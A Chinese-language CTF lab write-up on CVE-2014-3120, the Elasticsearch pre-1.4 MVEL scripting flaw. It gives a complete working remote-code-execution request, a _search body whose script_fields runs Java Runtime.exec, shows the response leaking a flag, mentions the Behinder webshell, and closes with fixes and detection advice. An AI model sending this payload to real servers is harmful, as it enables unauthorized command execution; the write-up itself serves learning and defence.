# elasticsearch-cve_2014_3120

今天练习一个古老的CVE，关于分布式检索与分析引擎ElasticSearch，也是我这段时间朝夕相处的ELK组件之一。

## 前置知识

### 什么是脚本引擎

所谓的脚本引擎，是为了增强程序的可配置性。怎么理解这个概念呢？首先让我们回顾一下程序的组成，程序 = 数据结构 + 算法。其中，算法就是我们对机器“说的话”，那机器怎么知道我们说话的含义呢？这就需要一个“翻译官”的角色，让我们说所的话（逻辑算法）能让机器明白。这之间，当然还需要好几个翻译官配合。那我们的脚本引擎所处的位置就是：人——程序——脚本引擎——......——机器。

可以看到，脚本引擎不是必须的，不是每个程序都需要一个留一个口子让人进去说话，但对于一个需要实现复杂功能的程序/系统来说，脚本引擎则起到了一个增强性的功能，让程序更加灵活，能做更多的配置。



#### ES Scripting的历史

| 版本                  | 使用的脚本引擎 |
| :-------------------- | :------------- |
| < Elasticsearch 1.4   | MVEL           |
| < Elasticsearch 5.0   | Groovy         |
| ‘>= Elasticsearch 5.0 | painless       |

本篇中我们浮现的漏洞就位于< ES 1.4版本，用的是MVEL脚本引擎，这个脚本赢取最大的安全问题就是——几乎没有任何安全机制。



## 利用过程

### 信息搜集

首先，我们模拟传统的渗透过程，进行信息搜集（此处省略），扫描发现端口服务，发现ES服务，访问后可以看到：

![](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200824233200.png)

此ES版本低于1.4，可以直接利用MVEL脚本引擎无安全防护的漏洞，进行远程代码执行，借助的接口或者说是功能入口是`script_fields` - `command` - `script`。



### 漏洞利用

首先要明确一下漏洞利用的过程：

-   由于脚本引擎没有安全机制，所以我们发送的恶意代码都可以执行
-   我们可以通过`_search`方法（ES的一种API）传入script代码
-   ES会动态执行传入的script代码，从而使机子运行后门



首先，`_search`方法会显示当前ES的记录，如果没有记录，则会报错。所以对一个空的ES我们需要用`POST`或`PUT`方法先插入数据：

![](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200825002601.png)

这里我用Postman发包，看到请求方法`POST`，在ES中想插入数据可以用这个请求方法，请求链接为`xxx/site/test?pretty=true`，其中site是我命名的index（索引），test为我创建的type（类型）。Body是我发送的JSON格式数据，创建一条字段名为name，值为test的记录。这些都是ES的概念，不清楚的同学可以查看：[Mastering Elasticsearch(中文版)](https://doc.yonyoucloud.com/doc/mastering-elasticsearch/chapter-1/121_README.html)。

接下来，直接上我们的神器Behinder看看

![](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200825004819.png)

果然是报错了，大马的命令更复杂，容易产生问题。我们可以根据这个情况魔改一下，参考：[冰蝎，从入门到魔改](https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247485811&idx=1&sn=dfe68ca403b7009e2f41e622dd2b690f)、[冰蝎，从入门到魔改（续）](https://www.anquanke.com/post/id/212739)。



### 获得Flag

今天比较晚了，先直接使用JAVA代码读取`/tmp`路径下的flag：

```java
import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"ls /tmp\").getInputStream()).useDelimiter(\"\\\\A\").next();
```

完整请求包为：

```json
{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"ls /tmp\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}
```

响应信息为：

```json
{
  "took" : 10,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 1.0,
    "hits" : [ {
      "_index" : "site",
      "_type" : "test",
      "_id" : "18Mqj5DuTN22Eb8WO-JzGw",
      "_score" : 1.0,
      "fields" : {
        "command" : [ "flag-{bmh0c5431ab-e4ec-4195-9818-94b20de3788f}\nhsperfdata_root\n" ]
      }
    } ]
  }
}

```

获得Flag。



## 修复

-   升级版本
-   设置 `script.disable_dynamic = true`，官方已在1.2版本中将 true 设置为默认值



## 总结

这是一个由于脚本引擎未做安全机制防护所导致的RCE，现在比较少见了。但是也可以看出，在程序中，有动态代码执行、脚本引擎的地方往往是比较危险的，在开发过程中需要格外注意。在蓝队的检测过程中，对于这些脚本引擎执行的相关数据需要额外注意。



## TODO

-   看冰蝎的入门到魔改：[冰蝎，从入门到魔改](https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247485811&idx=1&sn=dfe68ca403b7009e2f41e622dd2b690f)、[冰蝎，从入门到魔改（续）](https://www.anquanke.com/post/id/212739)

